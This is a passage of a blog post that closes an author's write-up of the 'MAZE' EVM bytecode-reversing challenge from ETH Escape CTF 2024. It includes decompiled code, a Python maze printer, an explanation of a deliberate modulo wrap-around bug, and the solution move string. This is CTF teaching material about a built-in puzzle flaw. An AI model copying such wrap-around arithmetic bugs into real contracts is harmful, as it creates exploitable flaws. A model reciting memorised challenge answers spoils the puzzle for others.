                        <span class="nx">MEM</span><span class="p">[</span><span class="nx">uint8</span><span class="p">.</span><span class="nx">max</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span><span class="mi">1</span> <span class="o">!=</span> <span class="nx">MEM</span><span class="p">[(</span><span class="nx">MEM</span><span class="p">[</span><span class="mi">320</span><span class="p">]</span> <span class="o">-</span> <span class="mi">49</span><span class="p">)</span> <span class="o">%</span> <span class="mi">1616</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="nx">MEM</span><span class="p">[</span><span class="mi">320</span><span class="p">]</span> <span class="o">-</span> <span class="mi">49</span><span class="p">)</span> <span class="o">%</span> <span class="mi">1616</span> <span class="o">%</span> <span class="p">(</span><span class="nx">uint8</span><span class="p">.</span><span class="nx">max</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x1</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">MEM</span><span class="p">[</span><span class="mi">320</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nx">MEM</span><span class="p">[</span><span class="mi">320</span><span class="p">]</span> <span class="o">-</span> <span class="mi">49</span><span class="p">)</span> <span class="o">%</span> <span class="mi">1616</span><span class="p">;</span>
                <span class="nx">MEM</span><span class="p">[</span><span class="nx">uint8</span><span class="p">.</span><span class="nx">max</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="nx">exit</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="mi">1615</span> <span class="o">==</span> <span class="nx">MEM</span><span class="p">[</span><span class="mi">320</span><span class="p">])</span> <span class="p">{</span>
            <span class="nx">_codeIsLawZ95677371</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
            <span class="nx">exit</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>First, we can decompile the bytecode using the Dedaub <a href="https://app.dedaub.com/decompile?md5=6686bb733ec4e8e4bbfa8b072234b7e0">decompiler</a>. However, the output seems quite different from what I expected, probably because I wrote this bytecode in Huff and used stack variables efficiently (ig).</p><p>As you can see, the map data is stored in <code class="language-plaintext highlighter-rouge">0x00 ~ 0xc0</code>, but <code class="language-plaintext highlighter-rouge">0x40</code> is missing in the decompiler. The initial position is stored in <code class="language-plaintext highlighter-rouge">MEM[320]</code> (<code class="language-plaintext highlighter-rouge">562 = 11 * 49 + 23 = [11][23]</code>). The loop iterates based on the length of the <code class="language-plaintext highlighter-rouge">msg.data</code>, and <code class="language-plaintext highlighter-rouge">MEM[uint8.max + 1]</code> (<code class="language-plaintext highlighter-rouge">MEM[0x100]</code>) is used as the iterator.</p><p>It checks if the bit in the new location is set according to the map. The size of a row is <code class="language-plaintext highlighter-rouge">49</code>, and it should approach <code class="language-plaintext highlighter-rouge">1615</code> (<code class="language-plaintext highlighter-rouge">[34][47]</code>).</p><h3 id="bytecode-reversing-with-bytegraphxyz">bytecode reversing with bytegraph.xyz<a href="#bytecode-reversing-with-bytegraphxyz" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><hr /><p>I prefer using <a href="https://bytegraph.xyz/bytecode/1c1b6c3e23794ada5a18c703d2527e0d/graph">bytegraph.xyz</a> for analyzing bytecode.</p><p><img data-src="/assets/img/2024-11-21-eth-escape/Pasted image 20241121022715.png" alt="img" data-proofer-ignore></p><p>It returns the value of slot <code class="language-plaintext highlighter-rouge">0</code> when the calldata is <code class="language-plaintext highlighter-rouge">DEADBEEF</code>.</p><p><img data-src="/assets/img/2024-11-21-eth-escape/Pasted image 20241121022806.png" alt="img" data-proofer-ignore></p><p>It stores map data in <code class="language-plaintext highlighter-rouge">0x00 ~ 0xc0</code>, position to <code class="language-plaintext highlighter-rouge">0x140</code> and iterator(0) to <code class="language-plaintext highlighter-rouge">0x100</code></p><p><img data-src="/assets/img/2024-11-21-eth-escape/Pasted image 20241121023053.png" alt="img" data-proofer-ignore></p><p>The loop iterates until iterator reaches the <code class="language-plaintext highlighter-rouge">calldatasize</code>, and if the <code class="language-plaintext highlighter-rouge">position</code> equals <code class="language-plaintext highlighter-rouge">0x64f</code> after the loop, it stores <code class="language-plaintext highlighter-rouge">1</code> in slot <code class="language-plaintext highlighter-rouge">0</code>.</p><p><img data-src="/assets/img/2024-11-21-eth-escape/Pasted image 20241121023711.png" alt="img" data-proofer-ignore></p><p>The user input can be one of the following: <code class="language-plaintext highlighter-rouge">w</code>, <code class="language-plaintext highlighter-rouge">a</code>, <code class="language-plaintext highlighter-rouge">s</code>, or <code class="language-plaintext highlighter-rouge">d</code>. I just realized a mistake: in other cases, it simply jumps to <code class="language-plaintext highlighter-rouge">w</code> instead of stopping, haha..</p><p><img data-src="/assets/img/2024-11-21-eth-escape/Pasted image 20241121024109.png" alt="img" data-proofer-ignore></p><p>There are six red boxes. Let’s examine the case of <code class="language-plaintext highlighter-rouge">w</code>:</p><ol><li>It calculates the next position by subtracting <code class="language-plaintext highlighter-rouge">0x31</code> (the size of a row). (<code class="language-plaintext highlighter-rouge">w -&gt; -0x31, s -&gt; +0x31, a -&gt; -1, d -&gt; +1</code>).<li>It performs a modulo operation with <code class="language-plaintext highlighter-rouge">0x650</code>. This is a bug because the position can be a negative value. If it is moduloed with <code class="language-plaintext highlighter-rouge">0x650</code>, it can jump to another location. For example, when the new position is <code class="language-plaintext highlighter-rouge">-1</code> (<code class="language-plaintext highlighter-rouge">0xff...</code>), the result of the modulo with <code class="language-plaintext highlighter-rouge">0x650</code> will be <code class="language-plaintext highlighter-rouge">0x60F</code> (<code class="language-plaintext highlighter-rouge">((1 &lt;&lt; 256) - 1) % 0x650</code>).<li>It divides the position by <code class="language-plaintext highlighter-rouge">0x100</code> and multiplies the result by <code class="language-plaintext highlighter-rouge">0x20</code> to determine the map to use.<li>It performs a modulo operation with <code class="language-plaintext highlighter-rouge">0x100</code> on the position and shifts the map to the right by that value to locate the corresponding bit.<li>It performs an AND operation with <code class="language-plaintext highlighter-rouge">1</code> to check the value of that bit. If the result is <code class="language-plaintext highlighter-rouge">1</code>, the EVM stops.</ol><p><img data-src="/assets/img/2024-11-21-eth-escape/Pasted image 20241121025113.png" alt="img" data-proofer-ignore></p><p>Finally, it updates the location and increases the iterator.</p><h3 id="the-maze">The maze<a href="#the-maze" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><hr /><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="n">maze</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x41327924f1b91fe820120120804b93f9248e3926010092082080000036fbefb8</span><span class="p">,</span>
<span class="mh">0x8c4f3a002402480003238db6237239920124124120b1db1249271c6412092400</span><span class="p">,</span>
<span class="mh">0x24904920be1b9249246fa082092492003238e493c6fc9900120804824b7e47e4</span><span class="p">,</span>
<span class="mh">0xf9fb9ff9dc9804020920904b927ee49249da0804004920131c9230c30c499048</span><span class="p">,</span>
<span class="mh">0x260920100904132493f7230df1904804120804c7e3fe7fe3e264020000000831</span><span class="p">,</span>
<span class="mh">0x4000b7279ff93bee64100000820831f11bf1c93ce804920104800ced89e7718f</span><span class="p">,</span>
<span class="mh">0x13feff7ff7ffe80080400</span><span class="p">]</span>
<span class="n">maze</span> <span class="o">=</span> <span class="p">[</span><span class="nb">format</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="s">'0256b'</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">maze</span><span class="p">]</span>
<span class="n">maze</span> <span class="o">=</span> <span class="p">[</span><span class="nb">list</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">maze</span><span class="p">]</span>
<span class="n">maze</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">(</span><span class="n">maze</span><span class="p">,[])</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">33</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">49</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">11</span> <span class="ow">and</span> <span class="n">j</span> <span class="o">==</span> <span class="mi">23</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">'S'</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
        <span class="k">elif</span> <span class="n">maze</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">49</span><span class="o">+</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="s">'1'</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">'#'</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">'.'</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
    <span class="k">print</span><span class="p">()</span>
</pre></table></code></div></div><p>You can print the maze using the code above.</p><p><img data-src="/assets/img/2024-11-21-eth-escape/Pasted image 20241121025531.png" alt="img" data-proofer-ignore></p><p>The <code class="language-plaintext highlighter-rouge">S</code> marks the starting point. If you try to find a way to reach the goal location, there will be no solution because I intentionally blocked the path to get there.</p><p><img data-src="/assets/img/2024-11-21-eth-escape/Pasted image 20241121030057.png" alt="img" data-proofer-ignore></p><p>The intended solution is going to <code class="language-plaintext highlighter-rouge">0x00</code>, setting the new position to <code class="language-plaintext highlighter-rouge">-1</code>, and then jumping to <code class="language-plaintext highlighter-rouge">0x60F</code> to escape the maze. However, there was an unintended solution that I couldn’t block. Additionally, there’s another method: reaching the location marked with a star also allows escaping the maze.</p><blockquote><p>aaawwwwwwaaaaaaaaaawwaaaaaawwaaaawawwddddddssddddddddds</p></blockquote><p>So, this was the intended solution.</p><h3 id="note-2">NOTE<a href="#note-2" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><hr /><p>I really enjoy bytecode reversing or EVM internal challenges :3. Recently, I solved a bytecode challenge in SCTF and also authored a fun bytecode challenge for a local CTF final. If anyone is interested, feel free to DM me</p><p>Additionally, I made an easier version for Project Sekai CTF. It’s not bytecode reversing but a Solidity assembly challenge. If you’re interested, give it a try! <a href="https://github.com/project-sekai-ctf/sekaictf-2024/tree/main/blockchains/zoo">Link</a></p><p>I was happy that many people especially enjoyed this challenge lol</p><h2 id="end">END<a href="#end" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>kudos to immunefi, ethereum foundation and mixy. I had very nice weekend during the devcon. Hope to do this kind of event onsite again!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/web3/'>WEB3</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/web3/" class="post-tag no-text-decoration" >web3</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=(CTF) ETH Escape CTF 2024 writeup (Feel, Vest, MAZE) - snwo&url=http://blog.solidity.kr/posts/(ctf)-2024-eth-escape-ctf/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=(CTF) ETH Escape CTF 2024 writeup (Feel, Vest, MAZE) - snwo&u=http://blog.solidity.kr/posts/(ctf)-2024-eth-escape-ctf/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=(CTF) ETH Escape CTF 2024 writeup (Feel, Vest, MAZE) - snwo&url=http://blog.solidity.kr/posts/(ctf)-2024-eth-escape-ctf/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/(ctf)-sonic-jailbreak-hackathon/">(CTF) Sonic Jailbreak hackathon writeup</a><li><a href="/posts/(ctf)-bi0s-ctf-2025/">(CTF) bi0s CTF 2025 writeup (blockchains)</a><li><a href="/posts/(ctf)-2024-eth-escape-ctf/">(CTF) ETH Escape CTF 2024 writeup (Feel, Vest, MAZE)</a><li><a href="/posts/(ctf)-2024-blazCTF/">(CTF) blazCTF 2024 writeup (Chisel as a Service, teragas)</a><li><a href="/posts/(ctf)-2024-SekaiCTF/">(CTF) SekaiCTF 2024 writeup (ZOO)</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web3/">web3</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/(ctf)-2024-realworldctf/"><div class="card-body"> <em class="timeago small" date="2024-01-30 17:02:13 +0900" >Jan 30, 2024</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(CTF) realworld CTF 2024 writeup (SafeBridge)</h3><div class="text-muted small"><p> web3 newbie’s solver for SafeBridge in rwctf 2024 Objective Drain the BRIDGE (L1ERC20Bridge) of its WETH balance. Setup The challenge setup is using the challenge.py file, with relayer.py also ...</p></div></div></a></div><div class="card"> <a href="/posts/(ctf)-2024-justCTF/"><div class="card-body"> <em class="timeago small" date="2024-06-16 17:02:13 +0900" >Jun 16, 2024</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(CTF) justCTF 2024 writeup (Blockchains)</h3><div class="text-muted small"><p> It was first time for me to solve move based challenge. Solved 3 blockchain challenges, World of Ottercraft, The Otter Scrolls, Dark BrOTTERhood ( all move based challenge ) The Otter Scrolls Al...</p></div></div></a></div><div class="card"> <a href="/posts/(ctf)-2024-SekaiCTF/"><div class="card-body"> <em class="timeago small" date="2024-08-27 05:02:13 +0900" >Aug 27, 2024</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(CTF) SekaiCTF 2024 writeup (ZOO)</h3><div class="text-muted small"><p> I made solidity assembly challenge in sekai ctf 2024. ended up with 13 solves. you can check the detail here ZOO welcome to assembly zoo There are two functions, fallback and commit (intern...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/(ctf)-2024-blazCTF/" class="btn btn-outline-primary" prompt="Older"><p>(CTF) blazCTF 2024 writeup (Chisel as a Service, teragas)</p></a> <a href="/posts/(ctf)-bi0s-ctf-2025/" class="btn btn-outline-primary" prompt="Newer"><p>(CTF) bi0s CTF 2025 writeup (blockchains)</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://twitter.com/snwo_kr">snwo</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web3/">web3</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-H9FVY2NFPZ"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-H9FVY2NFPZ'); }); </script>
